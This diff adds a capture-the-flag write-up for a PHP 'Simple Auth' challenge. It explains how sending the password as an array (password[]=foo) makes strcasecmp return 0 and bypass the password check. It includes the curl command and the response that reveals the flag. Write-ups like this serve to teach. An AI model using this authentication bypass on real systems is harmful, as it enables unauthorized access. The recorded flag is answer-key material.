@@ -1,0 +1,49 @@
+## FLAG
+FLAG_VQcTWEK7zZYzvLhX
+
+## Source code was provided (See source.php). Following part appears to be the key point.
+
+if (isset($_POST['password']))
+    if (strcasecmp($_POST['password'], $password) == 0)
+        echo "Congratulations! The flag is $password";
+
+## I checked the PHP manul for strcasecmp
+
+int strcasecmp ( string $str1 , string $str2 )
+Binary safe case-insensitive string comparison.
+Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.
+
+## So I somehow have to force strcasecmp to return 0.
+## I did some google search about strcasecmp vulnerability and found this page
+
+http://danuxx.blogspot.jp/2013/03/unauthorized-access-bypassing-php-strcmp.html
+
+## According to the above page, all I have to do is send invalid data to strcasecmp and force an error.
+## strcasecmp expects string as parameter. 
+## If you send invalid data type (such like array object), strcasecmp will get an error and return the value 0
+
+## You can send the array object like this.
+
+password[]=foo
+
+## Add square brackets [] after parameter. Data will be evaluated as array object.
+
+## I sent the array object using curl -F option.
+
+curl -F "password[]=foo" http://ctfq.sweetduet.info:10080/~q32/auth.php
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Simple Auth</title>
+  </head>
+  <body>
+    <div>
+Congratulations! The flag is FLAG_VQcTWEK7zZYzvLhX    </div>
+    <form method="POST">
+      <input type="password" name="password">
+      <input type="submit">
+    </form>
+  </body>
+</html>
+
+## Flag is FLAG_VQcTWEK7zZYzvLhX
